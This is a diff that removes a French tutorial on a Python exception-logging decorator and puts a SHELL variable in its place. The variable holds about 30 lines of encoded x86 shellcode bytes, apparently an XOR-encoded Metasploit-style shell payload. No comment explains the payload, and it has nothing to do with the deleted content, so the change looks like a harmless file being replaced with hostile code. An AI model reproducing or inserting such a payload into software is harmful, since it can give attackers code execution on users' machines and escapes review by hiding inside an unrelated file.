@@ -1,116 +1,31 @@
-Exemple complet avec un décorateur
-utils.py (même que précédemment, avec la fonction de debug) :
-python
-Copier le code
-import traceback
-
-def format_table(headers, rows):
-    """Formate un tableau avec des colonnes alignées."""
-    column_widths = [len(header) for header in headers]
-    for row in rows:
-        for i, cell in enumerate(row):
-            column_widths[i] = max(column_widths[i], len(str(cell)))
-    row_format = " | ".join(f"{{:<{width}}}" for width in column_widths)
-    header_line = row_format.format(*headers)
-    separator = "-+-".join("-" * width for width in column_widths)
-    data_lines = "\n".join(row_format.format(*[str(cell) for cell in row]) for row in rows)
-    return f"{header_line}\n{separator}\n{data_lines}"
-
-def debug_info_as_table():
-    """Capture et affiche les détails d'une exception sous forme de tableaux alignés."""
-    try:
-        exc_type, exc_value, exc_traceback = traceback.sys.exc_info()
-        stack_summary = traceback.extract_tb(exc_traceback)
-        
-        # Détails de la pile
-        error_details = [
-            [call.filename, call.lineno, call.name, call.line.strip()]
-            for call in stack_summary
-        ]
-        error_table = format_table(
-            headers=["File", "Line", "Function", "Code"],
-            rows=error_details
-        )
-        
-        frame = exc_traceback.tb_frame
-        while frame.tb_next is not None:
-            frame = frame.tb_next
-        locals_data = [[k, repr(v)] for k, v in frame.f_locals.items()]
-        locals_table = format_table(
-            headers=["Variable", "Value"],
-            rows=locals_data
-        )
-        return f"\n--- Stack Trace ---\n{error_table}\n\n--- Local Variables ---\n{locals_table}"
-    except Exception as e:
-        return f"Erreur dans debug_info_as_table : {e}"
-
-def error_decorator(func):
-    """Décorateur pour surveiller les exceptions dans les fonctions."""
-    def wrapper(*args, **kwargs):
-        try:
-            return func(*args, **kwargs)
-        except Exception:
-            print(f"Erreur détectée dans {func.__name__}:")
-            print(debug_info_as_table())  # Affichage de l'erreur via la fonction de debug
-            raise  # Réélever l'exception pour la laisser remonter
-    return wrapper
-main.py (utilisation du décorateur) :
-Dans ce fichier, vous appliquez le décorateur à la fonction qui peut potentiellement générer une exception, et le décorateur gère l'affichage des erreurs avec debug_info_as_table.
-
-python
-Copier le code
-from utils import error_decorator, debug_info_as_table
-
-@error_decorator
-def division(a, b):
-    return a / b  # Cela provoque une exception si b == 0
-
-def main():
-    try:
-        division(10, 0)  # Cela va provoquer une exception de division par zéro
-    except Exception as e:
-        print("Erreur détectée dans le main:")
-        print(debug_info_as_table())  # Vous pouvez aussi capturer l'erreur dans le main si nécessaire
-
-main()
-Fonctionnement du décorateur
-Le décorateur error_decorator entoure la fonction division et intercepte toutes les exceptions qui se produisent pendant l'exécution de cette fonction.
-Si une exception est capturée, le décorateur appelle la fonction debug_info_as_table pour afficher la stack trace et les variables locales dans un format de tableau.
-Ensuite, l'exception est réélevée (raise) pour permettre à l'appelant (ici, la fonction main) de capturer l'exception à son niveau, si nécessaire.
-Résultat attendu
-Lors de l'exécution, vous devriez voir quelque chose comme cela dans la sortie, si une division par zéro se produit :
-
-less
-Copier le code
-Erreur détectée dans division:
-
---- Stack Trace ---
-File        | Line | Function   | Code
-------------+------+------------+-------------------
-main.py     | 7    | division   | return a / b
-main.py     | 15   | main       | division(10, 0)
-
---- Local Variables ---
-Variable  | Value
-----------+-------
-a         | 10
-b         | 0
-
-Erreur détectée dans le main:
-
---- Stack Trace ---
-File        | Line | Function   | Code
-------------+------+------------+-------------------
-main.py     | 15   | main       | division(10, 0)
-
---- Local Variables ---
-Variable  | Value
-----------+-------
-e         | ZeroDivisionError('division by zero')
-Explication
-Décorateur (error_decorator) :
-
-Le décorateur attrape l'exception levée par division, appelle debug_info_as_table() pour afficher la stack trace et les variables locales, puis rééleve l'exception pour que le programme puisse la gérer dans le main().
-Gestion de l'exception dans main() :
-
-Si l'exception est réélevée, elle peut aussi être capturée dans le bloc try-except de la fonction main, où vous pouvez afficher des informations supplémentaires ou gérer l'erreur de manière spécifique.
+SHELL =  b""
+SHELL += b"\xb8\x9e\x3b\xe5\xc4\xda\xcf\xd9\x74\x24\xf4\x5d"
+SHELL += b"\x2b\xc9\xb1\x52\x31\x45\x12\x83\xc5\x04\x03\xdb"
+SHELL += b"\x35\x07\x31\x1f\xa1\x45\xba\xdf\x32\x2a\x32\x3a"
+SHELL += b"\x03\x6a\x20\x4f\x34\x5a\x22\x1d\xb9\x11\x66\xb5"
+SHELL += b"\x4a\x57\xaf\xba\xfb\xd2\x89\xf5\xfc\x4f\xe9\x94"
+SHELL += b"\x7e\x92\x3e\x76\xbe\x5d\x33\x77\x87\x80\xbe\x25"
+SHELL += b"\x50\xce\x6d\xd9\xd5\x9a\xad\x52\xa5\x0b\xb6\x87"
+SHELL += b"\x7e\x2d\x97\x16\xf4\x74\x37\x99\xd9\x0c\x7e\x81"
+SHELL += b"\x3e\x28\xc8\x3a\xf4\xc6\xcb\xea\xc4\x27\x67\xd3"
+SHELL += b"\xe8\xd5\x79\x14\xce\x05\x0c\x6c\x2c\xbb\x17\xab"
+SHELL += b"\x4e\x67\x9d\x2f\xe8\xec\x05\x8b\x08\x20\xd3\x58"
+SHELL += b"\x06\x8d\x97\x06\x0b\x10\x7b\x3d\x37\x99\x7a\x91"
+SHELL += b"\xb1\xd9\x58\x35\x99\xba\xc1\x6c\x47\x6c\xfd\x6e"
+SHELL += b"\x28\xd1\x5b\xe5\xc5\x06\xd6\xa4\x81\xeb\xdb\x56"
+SHELL += b"\x52\x64\x6b\x25\x60\x2b\xc7\xa1\xc8\xa4\xc1\x36"
+SHELL += b"\x2e\x9f\xb6\xa8\xd1\x20\xc7\xe1\x15\x74\x97\x99"
+SHELL += b"\xbc\xf5\x7c\x59\x40\x20\xd2\x09\xee\x9b\x93\xf9"
+SHELL += b"\x4e\x4c\x7c\x13\x41\xb3\x9c\x1c\x8b\xdc\x37\xe7"
+SHELL += b"\x5c\x23\x6f\xe7\x88\xcb\x72\xe7\xa1\x57\xfa\x01"
+SHELL += b"\xab\x77\xaa\x9a\x44\xe1\xf7\x50\xf4\xee\x2d\x1d"
+SHELL += b"\x36\x64\xc2\xe2\xf9\x8d\xaf\xf0\x6e\x7e\xfa\xaa"
+SHELL += b"\x39\x81\xd0\xc2\xa6\x10\xbf\x12\xa0\x08\x68\x45"
+SHELL += b"\xe5\xff\x61\x03\x1b\x59\xd8\x31\xe6\x3f\x23\xf1"
+SHELL += b"\x3d\xfc\xaa\xf8\xb0\xb8\x88\xea\x0c\x40\x95\x5e"
+SHELL += b"\xc1\x17\x43\x08\xa7\xc1\x25\xe2\x71\xbd\xef\x62"
+SHELL += b"\x07\x8d\x2f\xf4\x08\xd8\xd9\x18\xb8\xb5\x9f\x27"
+SHELL += b"\x75\x52\x28\x50\x6b\xc2\xd7\x8b\x2f\xe2\x35\x19"
+SHELL += b"\x5a\x8b\xe3\xc8\xe7\xd6\x13\x27\x2b\xef\x97\xcd"
+SHELL += b"\xd4\x14\x87\xa4\xd1\x51\x0f\x55\xa8\xca\xfa\x59"
+SHELL += b"\x1f\xea\x2e"
